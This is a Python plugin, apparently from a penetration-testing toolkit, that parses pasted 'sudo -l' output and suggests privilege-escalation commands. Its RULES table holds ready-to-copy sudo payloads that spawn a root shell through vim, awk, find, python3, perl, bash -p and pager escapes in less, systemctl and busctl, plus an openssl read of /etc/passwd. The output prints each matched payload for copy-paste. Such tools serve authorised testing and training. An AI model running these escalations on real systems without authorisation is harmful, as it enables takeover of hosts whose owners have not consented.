import sys
import re

# ==============================
# RULES (EASY TO EXTEND)
# ==============================

G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'
Y_LIGHT = '\033[93m' # Commands/Secrets/Alerts
W_BOLD, DIM = '\033[1m', '\033[2m'

RULES = {
    "vim": {
        "payload": "sudo vim -c ':!/bin/sh'",
    },
    "less": {
        "payload": "sudo less /etc/passwd  # then !sh",
    },
    "awk": {
        "payload": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
    },
    "find": {
        "payload": "sudo find . -exec /bin/sh \\; -quit",
    },
    "bash": {
        "payload": "sudo bash -p",
    },
    "python3": {
        "payload": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
    },
    "perl": {
        "payload": "sudo perl -e 'exec \"/bin/sh\";'",
    },
    "openssl": {
        "payload": "sudo openssl enc -in /etc/passwd",
    },
     "systemctl": {
        "payload": "sudo systemctl status trail.service",
        "notes": "Inside pager, type: !/bin/sh",
        "type": "pager_escape",
    },

    "busctl": {
        "payload": "sudo busctl --show-machine",
        "notes": "Inside pager, type: !/bin/sh",
        "type": "pager_escape",
    }

}


def extract_binaries(text):
    lines = text.strip().split("\n")
    binaries = []
    for line in lines:
        matches = re.findall(r"(/[\w/.\-]+)", line)
        binaries.extend(matches)
    return list(set(binaries))

def classify(binary):
    name = binary.split("/")[-1]
    if name in RULES:
        return ("exploit", RULES[name])
    return ("unknown", None)

def detect_flags(text):
    flags = []
    if "NOPASSWD" in text: flags.append("NOPASSWD")
    if "(ALL : ALL) ALL" in text: flags.append("FULL_ROOT")
    return flags

def run(data, cred, args):
    print(f"\n{W_BOLD}[*] SUDO PRIVILEGE AUDIT{W}")
    print(f"{DIM}Paste 'sudo -l' output (Press Ctrl+D when finished):{W}\n")

    try:
        raw_input = sys.stdin.read()
    except (KeyboardInterrupt, EOFError):
        print()
        return data

    if not raw_input.strip():
        print(f"  {R}└── Error: Input buffer empty.{W}\n")
        return data

    binaries = extract_binaries(raw_input)
    flags = detect_flags(raw_input)

    # 1. Configuration Flags Section
    if flags:
        print(f"\n{Y}[!] Detected Flags:{W}")
        for idx, f in enumerate(flags):
            is_last = (idx == len(flags) - 1)
            connector = "└── " if is_last else "├── "
            print(f"  {B}{connector}{W}{f}")

    # 2. Binaries Analysis Section
    print(f"\n{W_BOLD}[*] Analysis Results:{W}")
    if not binaries:
        print(f"  {R}└── No executable paths found in input.{W}\n")
        return data

    for idx, binary in enumerate(binaries):
        is_last = (idx == len(binaries) - 1)
        connector = "└── " if is_last else "├── "
        category, rule = classify(binary)

        if category == "exploit":
            print(f"  {B}{connector}{W}{G}[Match]{W} {binary}")
            
            # Completely isolated command line for easy copy-paste
            print(f"\n      {Y}{rule['payload']}{W}")
            if rule.get("notes"):
                print(f"      {DIM}{B}# Note: {W}{rule['notes']}{W}")
            print()
        else:
            print(f"  {B}{connector}{W}{DIM}[Unknown] {binary}{W}")

    print()
    return data